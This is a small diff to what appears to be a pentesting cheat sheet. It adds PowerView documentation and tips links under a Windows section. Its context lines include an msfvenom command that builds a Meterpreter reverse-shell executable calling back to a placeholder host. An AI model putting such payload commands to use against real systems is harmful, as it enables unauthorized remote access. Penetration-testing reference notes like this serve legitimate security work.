@@ -373,7 +373,10 @@ run
 
 ## windows
 - powerview
-https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+ - man:https://github.com/darkoperator/Veil-PowerView/tree/master/PowerView
+ - tips:https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
+
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local> LPORT=1111 -f exe -o reverse.exe
 
